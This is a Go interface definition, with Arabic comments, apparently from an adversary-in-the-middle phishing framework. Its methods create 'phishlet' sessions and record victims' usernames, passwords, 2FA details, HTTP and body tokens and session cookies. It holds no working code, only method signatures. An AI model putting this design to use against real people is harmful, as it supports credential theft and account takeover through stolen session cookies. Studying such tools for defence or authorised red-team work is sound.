package database

// IDatabase هي واجهة تحدد عمليات قاعدة البيانات المطلوبة
// كل تنفيذات قاعدة البيانات (BuntDB, MongoDB) يجب أن تنفذ هذه الواجهة
type IDatabase interface {
	// الأساسيات
	Close() error
	Flush()

	// إدارة الجلسات
	CreateSession(
		sid string, phishlet string, landing_url string, 
		useragent string, remote_addr string, 
		countryCode, countryName string,
		deviceType, browserType, browserVersion, osType, osVersion string,
		loginType string, has2FA bool, type2FA string,
	) error
	ListSessions() ([]*Session, error)
	GetSessionById(id int) (*Session, error)
	GetSessionBySid(sid string) (*Session, error)
	DeleteSession(sid string) error
	DeleteSessionById(id int) error

	// تحديث بيانات الجلسة
	SetSessionUsername(sid string, username string) error
	SetSessionPassword(sid string, password string) error
	SetSessionCustom(sid string, name string, value string) error
	SetSessionBodyTokens(sid string, tokens map[string]string) error
	SetSessionHttpTokens(sid string, tokens map[string]string) error
	SetSessionCookieTokens(sid string, tokens map[string]map[string]*CookieToken) error

	SetupSession(sid string, phishlet string, username string, password string, landing_url string, useragent string, remote_addr string) error
	UpdateSession(sid string, optionName string, optionValue string) error
	UpdateSessionTokens(sid string, tokens map[string]map[string]string) error
	UpdateSessionUsername(sid string, username string) error
	UpdateSessionPassword(sid string, password string) error
	UpdateSessionCustom(sid string, name string, value string) error
	UpdateSessionCookieTokens(sid string, domain string, key string, value map[string]string) error
} 